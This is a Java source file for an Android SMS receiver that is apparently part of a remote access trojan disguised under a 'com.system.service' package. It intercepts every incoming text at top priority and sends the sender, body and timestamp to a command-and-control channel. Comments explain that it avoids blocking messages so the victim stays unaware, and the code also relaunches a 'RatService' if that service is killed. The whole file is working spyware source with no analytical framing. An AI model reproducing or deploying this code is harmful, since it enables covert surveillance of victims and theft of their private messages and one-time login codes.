package com.system.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 * Intercepts incoming SMS in real time.
 * Priority 2147483647 — fires before any other app including the default SMS app.
 * Does NOT abort the broadcast (would block SMS from reaching the user and raise suspicion).
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED =
        "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (!SMS_RECEIVED.equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String   format = bundle.getString("format");
        if (pdus == null) return;

        StringBuilder sb = new StringBuilder();
        for (Object pdu : pdus) {
            SmsMessage msg = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                ? SmsMessage.createFromPdu((byte[]) pdu, format)
                : SmsMessage.createFromPdu((byte[]) pdu);

            if (msg != null) {
                sb.append("[SMS_LIVE]")
                  .append(" from=").append(msg.getOriginatingAddress())
                  .append(" body=").append(
                      msg.getMessageBody().replace("\n", " ").trim())
                  .append(" time=").append(msg.getTimestampMillis())
                  .append('\n');
            }
        }

        C2Sender.send(sb.toString().trim());

        // Ensure service is running (in case killed)
        Intent svc = new Intent(ctx, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(svc);
        } else {
            ctx.startService(svc);
        }
    }
}
